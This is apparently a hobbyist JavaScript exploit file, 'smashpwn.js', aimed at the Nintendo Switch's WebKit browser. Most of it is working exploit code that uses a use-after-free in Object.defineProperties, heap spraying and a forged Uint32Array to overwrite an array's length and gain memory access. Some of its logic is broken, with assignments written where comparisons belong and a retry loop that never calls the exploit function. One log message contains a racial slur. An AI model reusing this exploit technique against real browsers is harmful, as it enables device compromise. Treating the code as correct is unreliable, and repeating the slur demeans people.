       ///////////////////////////////////////////////////////////
      //                                                       //
     //            smashpwn.js                                //
    //            By: @azure_agst                            //
   //            protected under ABSE liscense              //
  //           to be fair it's mostly html stuff           //
 //                                                       //
///////////////////////////////////////////////////////////

/*

List of tools in smashpwn.js (injector.js):

WriteToConsole("Process","Message"); - To write to the on screen console
ClearConsole("Process"); - Clears on screen console
Start(); - starts exploit

*/

/*

Based off of @qwertyoruiop's webkit exploit:
    http://jbme.qwertyoruiop.com

We out here! 

*/

console.log('eh i use a html console i scripted up, so i can see errors on the switch.');
console.log('"we dont use the actual console that much, around here."');
console.log('with that being said, lets get to work.');



/////////////// CONSOLE AND HTML STUFF ///////////////


function timestamp() {
    var ts = new Date(); // for now
    h = (ts.getHours()<10?'0':'') + ts.getHours(); // => 9
    m = (ts.getMinutes()<10?'0':'') + ts.getMinutes(); // =>  30
    s = (ts.getSeconds()<10?'0':'') + ts.getSeconds(); // => 51
    var timestamp = h+':'+m+':'+s
    return timestamp;
}

function WriteToConsole(caller, message) {
    document.getElementById("status").innerHTML += "\n["+timestamp()+"] ["+caller+"]: "+message;
    window.scrollTo(0,document.body.scrollHeight);
}

function ClearConsole(caller) {
    document.getElementById("status").innerHTML = "["+timestamp()+"] ["+caller+"]: console cleared.";
}

function start() {
    WriteToConsole("injector.js","start command recieved!");
    go();
}

function createCookie(name,value,days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days*24*60*60*1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + value + expires + "; path=/";
}

function readCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}

var step = 0;
var steps = ['>', '>', ' ', ' '];
function cmd(){
    document.getElementById('top').innerHTML = steps[step++ % steps.length];
    setTimeout(cmd, 250);
}

var attempts = 0



/////////////// EXPLOIT (THIS IS WHAT ACTUALLY MATTERS) ///////////////


// garbage stuff
var pressure = new Array(100);
// do garbage collect
dgc = function() {
    for (var i = 0; i < pressure.length; i++) {
        pressure[i] = new Uint32Array(0x10000);
    }
    for (var i = 0; i < pressure.length; i++) {
        pressure[i] = 0;
    }
}

// access to the overlapping Uint32Array
var bufs = new Array(0x1000);
// modify vector
var smash = new Uint32Array(0x10);
// the array with the stale pointer
var stale = 0;

var _dview = null;
// write 2x 32bit in a dataview, then get float
function u2d(low, hi) {
    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
    _dview.setUint32(0, hi);
    _dview.setUint32(4, low);
    return _dview.getFloat64(0);
} 

function go_() {
    //check to see if smash worked already. if so, bail.
    if (smash.length != 0x10) return;

    dgc();

    var arr = new Array(0x100);
    var yolo = new ArrayBuffer(0x1000);

    arr[0] = yolo;
    arr[1] = 0x13371337;

    var not_number = {};
    not_number.toString = function() {
        arr = null;
        props["stale"]["value"] = null;

        if (bufs[0]) return 10;

        for (var i = 0; i < 20; i++) {
            dgc();
        }

        //for the whole buf array
        for (i = 0; i < bufs.length; i++) {
            //fill with Uint32Arrays that contain arr
            bufs[i] = new Uint32Array(0x100 * 2)
            
            //for each element:
            for (k = 0; k < bufs[i].length;) {
                //set mem to Integer 0x41414141
                bufs[i][k++] = 0x41414141
                bufs[i][k++] = 0xffff0000
            }
        }
        return 10; 
    };

    //define an object with some new properties
    var props = {
        p0: { value: 0 },
        p1: { value: 1 },
        p2: { value: 2 },
        p3: { value: 3 },
        p4: { value: 4 },
        p5: { value: 5 },
        p6: { value: 6 },
        p7: { value: 7 },
        p8: { value: 8 },
        //fuck with toString()
        length: { value: not_number },
        //reference to arr
        stale: { value: arr },
        after: { value: 666 }
    };
    //define new tagret array
    var target = [];


      ////////////////
     //we out here!//
    ////////////////


    //set properties to the previously defined ones
    Object.defineProperties(target, props);

    //get reference to stale
    stale = target.stale;

    //make sure stale points to 0x41414141. if not, GTFO
    if(stale[0]==0x41414141) {
        //verified! now make it 0x41414242
        stale[0] += 0x101
        //stale[0] = 0x41414242
        //notify user at this point maybe? nah.

        //search for what's overlaying old arr.
        for (i = 0; i < bufs.length; i++) {
            for (k = 0; k < bufs[0].length; k++) {
                //found! bufs[i][k] now point to stale[0]
                //check it again
                if (bufs[i][k] = 0x41414242) {
                    //verified!
                    WriteToConsole("injector.js",'overlapping arrays found at bufs['+i+']['+k+']\nsmash.length is still 0x'+smash.length.toString(16));
                    
                    //create new object. i.e:
                    //0x0100150000000136 0x0000000000000000 <- Fic. Value
                    //0x0000000000000064 0x0000000000000000 <- ['a'],['b']
                    //0x???????????????? 0x0000000000000100 <- ['c'],['d']
                    stale[0] = {
                        'a': u2d(105, 0), //The JSObject Props. 105 is struct. ID of Uint32Array
                        'b': u2d(0,0),
                        'c': smash,
                        'd': u2d(0x100, 0)
                    }
                    WriteToConsole("injector.js","created stale:\n"+stale[0]);

                    // remember original stale
                    stale[1] = stale[0];

                    //now add 0x10 to the pointer
                    bufs[i][k] += 0x10;

                    //normally phrack would go here but it makes it super spotty so.... nahhhhh

                     //give some info. stale[0] should now be a uint32array
                     WriteToConsole("injector.js",stale[0]);

                     //write to the 6th 32bit value of the memory pointed to by the crafted uint32array
                     //should point to the struct of smash, allowing us to overwrite the length of smash
                     stale[0][6] = 0x1337;

                     //check it!
                     WriteToConsole("injector.js",'smash length = '+smash.length.toString(16));
                     WriteToConsole("switchhax","We in, nigga!")
                     WriteToConsole("injector.js",'no payload, so switch will probably crash now lmao')
                     return;
                }
            }
        }
    }
    setTimeout(function() {document.location.reload();}, 1000);
} //end go_

function go() {
    if (attempts < 5) {
        attempts = attempts + 1
        WriteToConsole("injector.js",'attempting exploit. (attempt '+attempts+'/5)');
        dgc();
        dgc();
        dgc();
        dgc();
        dgc();
        dgc();
        setTimeout(function(){go()}, 2000);
    } else if (attempts = 6) {
        WriteToConsole("injector.js","Bug patched or something? try reloading and retrying.")
        WriteToConsole("injector.js","<a href='javascript:document.location.reload();'>reload?</a>")
        return;
    }
}



/////////////// ALRIGHT BACK TO HTML BULLSHIT ///////////////


//start console
ClearConsole("injector.js");
WriteToConsole("switchhax","payload ready! &#x1f60a;");

// Switch Browser?
if(navigator.userAgent.indexOf('Nintendo Switch')>-1) {
    WriteToConsole("injector.js",'Found Nintendo Switch! &#x1f3ae;');
} else {
    WriteToConsole("@azure_agst","");
    WriteToConsole("@azure_agst","come, on man. you're not even on the switch.");
    WriteToConsole("@azure_agst","i mean, go ahead, but it isnt gonna work.");
    WriteToConsole("@azure_agst","");
    document.getElementById("button").innerHTML = "you sure you wanna go?";
}

setTimeout(function(){WriteToConsole("injector.js","awaiting start command...")}, 500);

cmd();

//end